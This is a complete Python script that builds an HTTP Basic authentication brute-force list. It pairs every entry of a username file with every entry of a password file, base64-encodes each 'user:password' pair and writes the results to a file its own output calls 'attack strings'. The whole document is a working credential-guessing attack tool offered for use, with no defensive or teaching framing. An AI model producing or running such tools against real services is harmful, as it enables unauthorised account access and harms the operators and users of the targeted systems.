import base64
import argparse

parser = argparse.ArgumentParser(description="\nUsage: python http_basic_bruteforce.py -u [username file] -p [password file]")
parser.add_argument("-u", dest="usernames", help="Path to username file")
parser.add_argument("-p", dest="passwords", help="Path to password file")

parsed_args, unknown = parser.parse_known_args()

usernames = parsed_args.usernames
usernames = open(usernames, "r")
usernames = list(usernames)

passwords = parsed_args.passwords
passwords = open(passwords, "r")
passwords = list(passwords)

bruteforce_list = open("bruteforce.txt", "a")

counter = 0

for name in usernames:
    name = name.strip() 

    for password in passwords:
        password = password.strip() 
        auth_string = name+":"+password
        try:
            auth_string = auth_string.encode('ascii')
            encoded = base64.b64encode(auth_string)
            encoded = encoded.decode('ascii')
            bruteforce_list.write(encoded + '\n')
            counter += 1
        except:
            pass
        if(counter % 1000000 == 0):
            print("1 million done")


bruteforce_list.close()
print("We genereated "+str(counter)+" new http basic auth attack strings")

